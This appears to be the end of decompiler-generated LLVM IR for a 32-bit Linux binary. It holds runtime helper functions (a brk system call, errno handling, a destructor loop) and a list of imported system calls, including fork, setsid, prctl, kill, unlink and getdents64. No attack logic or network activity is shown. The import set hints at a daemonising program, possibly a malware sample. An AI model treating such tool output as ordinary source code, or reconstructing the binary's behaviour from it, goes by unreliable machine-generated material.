  uselistorder i32 -256, { 4, 38, 39, 40, 41, 42, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 8, 9, 23, 10, 13, 15, 24, 17, 18, 19, 5, 6, 7, 11, 12, 14, 16, 20, 21, 22, 27, 25, 26, 28, 29, 30, 31, 32, 33, 34, 35, 2, 3, 36, 37, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 68, 69, 70, 71, 0, 72, 73, 74, 1, 75, 76, 77, 78, 79 }
  uselistorder i32 -48, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 10, { 1, 18, 19, 13, 20, 2, 25, 8, 0, 3, 9, 4, 10, 5, 11, 16, 15, 14, 12, 17, 21, 22, 23, 6, 24, 7, 26, 27, 28 }
  uselistorder i32* @edx, { 23, 3, 67, 68, 69, 32, 18, 0, 20, 21, 55, 56, 57, 58, 19, 70, 71, 72, 73, 76, 75, 77, 85, 86, 4, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 5, 100, 101, 83, 84, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 6, 49, 50, 51, 102, 147, 148, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 7, 140, 141, 142, 143, 144, 145, 146, 82, 22, 79, 59, 60, 149, 81, 61, 74, 78, 62, 80, 150, 151, 1, 152, 153, 154, 8, 155, 156, 157, 158, 159, 160, 161, 9, 162, 15, 24, 25, 26, 27, 13, 14, 11, 10, 28, 16, 29, 12, 31, 30, 52, 53, 54, 17, 63, 64, 65, 66, 2, 163, 164, 165, 166, 167, 168, 169 }
  uselistorder i8 0, { 46, 47, 85, 86, 68, 33, 43, 69, 6, 87, 88, 89, 90, 58, 91, 92, 93, 94, 95, 96, 34, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 2, 112, 113, 114, 115, 48, 52, 53, 49, 54, 50, 51, 55, 0, 56, 57, 60, 62, 59, 7, 61, 8, 63, 64, 65, 66, 67, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 70, 25, 26, 71, 27, 28, 29, 30, 31, 32, 72, 73, 74, 75, 76, 5, 77, 78, 9, 79, 80, 81, 82, 83, 84, 35, 36, 116, 117, 3, 119, 120, 118, 121, 122, 123, 124, 4, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 44, 145, 1, 146, 37, 45, 38, 39, 40, 41, 42 }
  uselistorder i32 2, { 59, 60, 61, 1, 92, 21, 93, 29, 56, 0, 30, 50, 31, 51, 32, 52, 15, 2, 88, 20, 3, 4, 5, 82, 6, 7, 8, 22, 23, 94, 9, 10, 27, 11, 33, 24, 28, 36, 34, 35, 17, 16, 25, 37, 26, 38, 64, 65, 78, 79, 67, 62, 66, 68, 69, 70, 71, 72, 73, 74, 75, 63, 76, 77, 13, 57, 40, 39, 83, 84, 85, 86, 87, 41, 44, 42, 45, 19, 43, 12, 46, 53, 47, 54, 48, 55, 49, 89, 90, 91, 14, 18, 80, 81, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 58 }
  uselistorder i8* null, { 34, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80553f7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80553f5, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80553a7, { 1, 0 }
  uselistorder label %dec_label_pc_8055383, { 1, 0 }
}

define i32 @function_80553fd() local_unnamed_addr {
dec_label_pc_80553fd:
  %v0_80553fd = load i32, i32* @eax, align 4
  %v1_80553fd = add i32 %v0_80553fd, 28
  %v2_80553fd = inttoptr i32 %v1_80553fd to i32*
  %v3_80553fd = load i32, i32* %v2_80553fd, align 4
  store i32 %v3_80553fd, i32* @global_var_80578f8.247, align 8
  %v1_8055406 = add i32 %v0_80553fd, 44
  %v2_8055406 = inttoptr i32 %v1_8055406 to i32*
  %v3_8055406 = load i32, i32* %v2_8055406, align 4
  store i32 %v3_8055406, i32* @global_var_80578fc.248, align 4
  ret i32 %v3_8055406

; uselistorder directives
  uselistorder i32 44, { 7, 5, 4, 11, 13, 12, 8, 9, 10, 0, 2, 6, 14, 15, 16, 17, 1, 3 }
  uselistorder i32 28, { 29, 26, 27, 15, 24, 25, 30, 5, 6, 12, 7, 10, 11, 8, 16, 9, 17, 18, 19, 20, 21, 23, 22, 0, 28, 1, 13, 31, 4, 14, 3, 2, 32, 33, 34 }
}

define i32 @function_805540f(i32 %arg1) local_unnamed_addr {
dec_label_pc_805540f:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805540f = load i32, i32* @ebx, align 4
  store i32 %v0_805540f, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8055422 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8055422, i32* @global_var_8057318.246, align 8
  %v7_805542d = icmp ult i32 %v1_8055422, %arg1
  %v1_805542f = icmp eq i1 %v7_805542d, false
  br i1 %v1_805542f, label %dec_label_pc_805543f, label %dec_label_pc_8055431

dec_label_pc_8055431:                             ; preds = %dec_label_pc_805540f
  %v1_8055431 = call i32 @function_80530f9(i32 %v0_805540f)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8055439 = inttoptr i32 %v1_8055431 to i32*
  store i32 12, i32* %v1_8055439, align 4
  %v0_805543f.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_8055443.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805543f

dec_label_pc_805543f:                             ; preds = %dec_label_pc_805540f, %dec_label_pc_8055431
  %v2_8055443 = phi i32 [ %v0_805540f, %dec_label_pc_805540f ], [ %v2_8055443.pre, %dec_label_pc_8055431 ]
  %v0_805543f = phi i32 [ 0, %dec_label_pc_805540f ], [ %v0_805543f.pre, %dec_label_pc_8055431 ]
  store i32 %v2_8055443, i32* @ebx, align 4
  ret i32 %v0_805543f

; uselistorder directives
  uselistorder i32 %v1_8055422, { 1, 0 }
  uselistorder i32 12, { 128, 114, 115, 116, 117, 118, 82, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 108, 109, 110, 111, 112, 113, 144, 162, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 73, 161, 74, 119, 120, 121, 122, 123, 68, 75, 69, 76, 70, 77, 71, 78, 72, 79, 66, 80, 85, 86, 95, 96, 97, 98, 87, 99, 90, 83, 89, 91, 92, 93, 100, 84, 88, 28, 94, 101, 107, 67, 102, 104, 105, 29, 103, 30, 31, 32, 33, 124, 0, 125, 126, 127, 34, 35, 36, 37, 38, 39, 106, 1, 2, 26, 10, 9, 8, 16, 64, 21, 43, 44, 42, 17, 49, 41, 47, 48, 18, 163, 7, 45, 46, 4, 6, 40, 164, 65, 165, 169, 166, 167, 168, 50, 51, 52, 53, 19, 20, 54, 55, 56, 170, 57, 58, 59, 60, 61, 62, 63, 5, 22, 23, 11, 12, 13, 14, 15, 171, 24, 3, 25, 172, 173, 27, 81 }
  uselistorder i32* @global_var_8057318.246, { 1, 0, 2 }
  uselistorder i32 45, { 1, 3, 0, 4, 2 }
  uselistorder label %dec_label_pc_805543f, { 1, 0 }
}

define i32 @function_8055445() local_unnamed_addr {
dec_label_pc_8055445:
  %v0_8055448 = load i32, i32* @eax, align 4
  %v1_805544a = sub i32 0, %v0_8055448
  %v1_805544c = call i32 @function_80530f9(i32 ptrtoint (i32* @0 to i32))
  %v2_8055451 = inttoptr i32 %v1_805544c to i32*
  store i32 %v1_805544a, i32* %v2_8055451, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 (i32)* @function_80530f9, { 36, 35, 53, 34, 33, 45, 2, 32, 56, 31, 30, 29, 1, 0, 42, 57, 28, 27, 26, 24, 23, 22, 41, 40, 44, 4, 17, 5, 55, 54, 39, 38, 37, 52, 16, 11, 19, 18, 51, 10, 15, 14, 50, 25, 21, 49, 13, 20, 12, 9, 48, 8, 7, 47, 46, 43, 6, 3 }
  uselistorder i32* @0, { 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 1, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 0, 1, 2, 3, 4, 5, 6, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 7, 8, 9, 18, 13, 16, 17, 14, 10, 11, 12, 15, 32, 33, 34, 35, 36, 37, 19, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 97, 96, 201, 95, 129, 130, 181, 182, 183, 131, 132, 128, 149, 148, 144, 145, 146, 147, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 98, 184, 185, 186, 187, 188, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 202, 203, 204, 205, 206, 207 }
}

define i32 @function_8055460() local_unnamed_addr {
dec_label_pc_8055460:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805546c = load i32, i32* @global_var_80571a4.233, align 4
  %v10_8055471 = icmp eq i32 %v0_805546c, -1
  br i1 %v10_8055471, label %dec_label_pc_8055482, label %dec_label_pc_8055476.preheader

dec_label_pc_8055476.preheader:                   ; preds = %dec_label_pc_8055460
  br label %dec_label_pc_8055476

dec_label_pc_8055476:                             ; preds = %dec_label_pc_8055476.preheader, %dec_label_pc_8055476
  %v4_8055479 = phi i32 [ %v0_805546c, %dec_label_pc_8055476.preheader ], [ %v2_805547b, %dec_label_pc_8055476 ]
  %v0_8055476 = phi i32 [ ptrtoint (i32* @global_var_80571a4.233 to i32), %dec_label_pc_8055476.preheader ], [ %v1_8055476, %dec_label_pc_8055476 ]
  %v1_8055476 = add i32 %v0_8055476, -4
  call void @__pseudo_call(i32 %v4_8055479)
  %v1_805547b = inttoptr i32 %v1_8055476 to i32*
  %v2_805547b = load i32, i32* %v1_805547b, align 4
  %v10_805547d = icmp eq i32 %v2_805547b, -1
  %v1_8055480 = icmp eq i1 %v10_805547d, false
  br i1 %v1_8055480, label %dec_label_pc_8055476, label %dec_label_pc_8055482.loopexit

dec_label_pc_8055482.loopexit:                    ; preds = %dec_label_pc_8055476
  %v2_8055482.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8055482

dec_label_pc_8055482:                             ; preds = %dec_label_pc_8055482.loopexit, %dec_label_pc_8055460
  %v2_8055482 = phi i32 [ %v2_8055482.pre, %dec_label_pc_8055482.loopexit ], [ %tmp6, %dec_label_pc_8055460 ]
  ret i32 %v2_8055482

; uselistorder directives
  uselistorder i32 %v0_805546c, { 1, 0 }
  uselistorder i1 false, { 125, 126, 28, 29, 31, 30, 127, 128, 129, 97, 98, 130, 133, 134, 135, 136, 137, 139, 11, 140, 141, 138, 132, 131, 25, 142, 143, 144, 1, 146, 147, 0, 148, 99, 100, 101, 102, 103, 104, 12, 149, 150, 151, 3, 152, 153, 154, 155, 2, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 156, 79, 80, 81, 82, 83, 84, 85, 86, 87, 169, 170, 171, 172, 173, 174, 175, 176, 177, 10, 179, 178, 183, 180, 181, 182, 13, 184, 185, 145, 26, 4, 27, 186, 187, 15, 105, 106, 107, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 16, 198, 108, 109, 110, 199, 200, 201, 5, 32, 6, 202, 203, 204, 35, 45, 50, 51, 36, 53, 46, 47, 48, 52, 33, 34, 37, 38, 39, 40, 41, 42, 43, 44, 49, 54, 55, 78, 76, 18, 77, 19, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 75, 70, 73, 88, 89, 90, 91, 92, 93, 94, 20, 95, 96, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 71, 72, 74, 205, 206, 207, 208, 209, 7, 211, 212, 213, 210, 214, 215, 216, 217, 218, 219, 8, 220, 221, 222, 223, 17, 224, 225, 226, 227, 228, 229, 230, 22, 21, 231, 23, 232, 233, 234, 235, 9, 24, 14, 236 }
  uselistorder void (i32)* @__pseudo_call, { 1, 3, 4, 5, 6, 2, 0 }
  uselistorder i32 -4, { 15, 16, 17, 18, 102, 103, 104, 105, 11, 106, 3, 101, 19, 97, 12, 98, 99, 100, 13, 0, 9, 10, 107, 108, 109, 110, 111, 112, 113, 14, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 7, 57, 8, 58, 59, 60, 2, 6, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 4, 5, 89, 90, 91, 92, 93, 94, 95, 1, 96 }
  uselistorder i32 ptrtoint (i32* @global_var_80571a4.233 to i32), { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 -1, { 27, 28, 0, 122, 205, 77, 123, 78, 79, 124, 80, 125, 81, 126, 82, 127, 83, 128, 84, 129, 85, 130, 86, 131, 87, 132, 25, 26, 13, 12, 88, 89, 133, 90, 134, 91, 135, 29, 1, 136, 76, 92, 93, 137, 138, 139, 15, 140, 14, 141, 95, 94, 142, 206, 17, 18, 143, 16, 144, 30, 207, 31, 145, 208, 34, 33, 35, 36, 22, 37, 96, 38, 146, 32, 209, 11, 147, 148, 118, 149, 19, 39, 2, 97, 210, 211, 98, 203, 40, 99, 150, 100, 151, 101, 152, 74, 75, 153, 102, 154, 103, 155, 104, 156, 105, 157, 106, 158, 107, 159, 108, 160, 109, 161, 110, 162, 111, 163, 112, 164, 113, 165, 114, 166, 115, 167, 116, 168, 41, 169, 170, 3, 171, 20, 4, 172, 42, 173, 117, 212, 119, 43, 174, 175, 199, 200, 176, 195, 201, 44, 177, 178, 179, 180, 196, 48, 181, 182, 183, 184, 185, 186, 47, 187, 197, 45, 46, 188, 198, 189, 190, 49, 191, 202, 5, 50, 51, 52, 53, 54, 192, 193, 23, 6, 55, 194, 21, 10, 9, 8, 7, 56, 204, 57, 58, 59, 60, 61, 62, 24, 63, 213, 214, 215, 64, 216, 217, 70, 65, 218, 66, 67, 68, 69, 219, 71, 220, 72, 73, 221, 222, 120, 121 }
  uselistorder i32 1, {}
  uselistorder label %dec_label_pc_8055476, { 1, 0 }
}

define i32 @function_8055486() local_unnamed_addr {
entry:
  %v0_8055489 = load i32, i32* @ebx, align 4
  %v1_805548a = call i32 @function_80480b0(i32 %v0_8055489)
  store i32 %v1_805548a, i32* @eax, align 4
  %v0_8055495 = call i32 @function_80480c0()
  ret i32 %v0_8055495

; uselistorder directives
  uselistorder i32* @eax, { 9, 50, 51, 53, 54, 55, 56, 58, 16, 59, 1, 57, 6, 8, 52, 60, 62, 63, 61, 34, 35, 64, 70, 65, 66, 68, 69, 67, 37, 38, 11, 2, 3, 10, 24, 26, 25, 27, 31, 32, 33, 28, 29, 30, 36, 5, 17, 39, 18, 40, 41, 42, 12, 43, 0, 13, 14, 44, 45, 46, 47, 15, 71, 19, 20, 21, 72, 73, 74, 75, 76, 22, 23, 77, 48, 49, 4, 7 }
  uselistorder i32 (i32)* @function_80480b0, { 1, 0 }
  uselistorder i32 0, { 686, 70, 397, 71, 475, 476, 72, 477, 478, 479, 73, 145, 146, 586, 587, 74, 481, 687, 688, 689, 203, 690, 691, 692, 565, 588, 589, 693, 466, 465, 694, 695, 696, 467, 590, 591, 592, 593, 463, 697, 698, 699, 75, 700, 147, 705, 706, 10, 76, 398, 11, 399, 400, 708, 709, 139, 710, 77, 379, 78, 204, 205, 0, 701, 702, 703, 79, 464, 390, 80, 401, 711, 1, 148, 149, 81, 712, 713, 82, 83, 715, 714, 26, 27, 716, 719, 206, 380, 720, 722, 721, 24, 25, 723, 704, 594, 595, 596, 597, 402, 403, 53, 598, 202, 404, 150, 84, 724, 30, 381, 85, 151, 728, 731, 730, 28, 29, 734, 735, 736, 737, 738, 152, 739, 740, 741, 207, 732, 208, 733, 209, 405, 566, 64, 567, 153, 406, 568, 569, 742, 743, 744, 745, 746, 747, 748, 749, 750, 154, 155, 751, 407, 763, 408, 409, 210, 382, 410, 211, 383, 86, 411, 752, 753, 87, 88, 212, 384, 66, 754, 755, 756, 89, 90, 213, 385, 65, 757, 140, 758, 55, 759, 760, 762, 412, 761, 2, 729, 717, 718, 468, 469, 471, 470, 31, 32, 3, 156, 472, 473, 474, 480, 599, 600, 413, 414, 601, 602, 603, 604, 605, 606, 607, 608, 415, 482, 609, 764, 727, 483, 765, 610, 611, 484, 707, 67, 157, 725, 485, 612, 726, 613, 766, 486, 767, 768, 416, 769, 8, 91, 417, 770, 214, 771, 772, 158, 773, 12, 33, 56, 13, 57, 14, 774, 4, 34, 58, 15, 59, 16, 93, 92, 60, 17, 94, 95, 487, 68, 614, 615, 96, 418, 392, 775, 776, 777, 778, 779, 780, 99, 98, 97, 781, 168, 101, 100, 102, 419, 782, 137, 420, 488, 421, 422, 9, 103, 423, 61, 18, 104, 424, 105, 425, 426, 427, 491, 492, 493, 428, 159, 494, 496, 497, 498, 429, 510, 511, 512, 513, 514, 107, 108, 430, 515, 516, 499, 431, 432, 521, 522, 520, 508, 509, 489, 490, 517, 518, 519, 500, 501, 502, 503, 504, 505, 506, 507, 19, 142, 143, 138, 433, 106, 434, 523, 563, 564, 560, 561, 562, 141, 558, 559, 109, 435, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 393, 436, 536, 437, 110, 438, 538, 539, 540, 541, 542, 160, 161, 543, 544, 545, 439, 495, 553, 554, 555, 556, 546, 547, 548, 552, 557, 111, 162, 537, 112, 386, 440, 441, 394, 395, 570, 571, 47, 45, 442, 46, 44, 443, 572, 573, 574, 575, 576, 577, 578, 169, 444, 579, 580, 581, 582, 387, 445, 446, 583, 584, 69, 585, 163, 113, 177, 616, 114, 184, 185, 186, 175, 176, 35, 36, 617, 618, 619, 115, 51, 620, 621, 622, 623, 116, 50, 624, 625, 626, 627, 117, 49, 628, 629, 630, 631, 118, 48, 632, 633, 634, 178, 179, 180, 181, 182, 183, 635, 636, 173, 172, 637, 170, 7, 6, 171, 638, 174, 639, 187, 640, 188, 641, 189, 642, 190, 643, 645, 646, 647, 644, 648, 649, 191, 192, 650, 164, 651, 165, 166, 119, 674, 20, 62, 388, 447, 448, 449, 652, 658, 193, 653, 654, 194, 655, 195, 656, 196, 657, 39, 659, 197, 198, 660, 199, 661, 662, 200, 663, 201, 664, 665, 666, 667, 450, 668, 669, 670, 671, 38, 215, 120, 121, 451, 452, 672, 673, 52, 63, 122, 453, 37, 216, 218, 219, 454, 123, 124, 217, 389, 125, 549, 550, 551, 21, 126, 396, 22, 220, 127, 128, 675, 676, 677, 678, 679, 680, 783, 784, 681, 682, 785, 786, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 787, 788, 789, 790, 791, 792, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 43, 848, 849, 850, 851, 852, 853, 854, 129, 455, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 456, 893, 885, 886, 887, 888, 889, 890, 891, 892, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 130, 457, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 221, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 969, 968, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 131, 458, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 132, 459, 1018, 1019, 391, 1020, 1021, 460, 1022, 1023, 1024, 133, 461, 1025, 54, 1026, 23, 40, 41, 42, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 167, 134, 135, 5, 683, 684, 685, 136, 462, 144, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042 }
  uselistorder i32* @ebx, { 22, 374, 375, 231, 232, 27, 376, 2, 377, 378, 379, 380, 182, 183, 381, 24, 382, 383, 384, 385, 386, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 3, 252, 253, 254, 23, 387, 388, 389, 390, 391, 392, 393, 394, 395, 20, 21, 404, 405, 406, 407, 17, 4, 16, 398, 401, 402, 403, 396, 408, 409, 410, 411, 412, 413, 414, 415, 397, 255, 256, 424, 425, 426, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 5, 441, 442, 427, 428, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 6, 196, 197, 198, 199, 200, 201, 202, 443, 468, 469, 470, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 18, 454, 455, 456, 457, 458, 7, 459, 460, 461, 462, 463, 464, 465, 466, 467, 422, 423, 25, 26, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 28, 285, 286, 471, 472, 420, 421, 29, 473, 474, 287, 288, 289, 290, 30, 399, 400, 416, 417, 31, 291, 292, 418, 419, 293, 294, 475, 476, 32, 477, 478, 479, 33, 295, 296, 8, 297, 298, 34, 35, 480, 481, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 138, 139, 140, 156, 10, 157, 158, 159, 160, 145, 146, 161, 143, 136, 142, 144, 147, 148, 149, 137, 162, 141, 150, 151, 152, 153, 154, 155, 163, 164, 165, 166, 167, 168, 178, 179, 180, 9, 181, 169, 170, 171, 172, 173, 174, 175, 176, 177, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 11, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 301, 299, 300, 0, 302, 303, 304, 305, 306, 307, 12, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 19, 359, 360, 361, 362, 363, 364, 365, 482, 483, 484, 366, 367, 368, 369, 485, 486, 487, 488, 13, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 489, 490, 491, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 1, 521, 522, 523, 524, 525, 15, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 14, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 370, 371, 372, 373 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @getppid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32* @mremap(i32*, i32, i32, i32, ...) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

declare i64 @__decompiler_undefined_function_5() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %tms* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
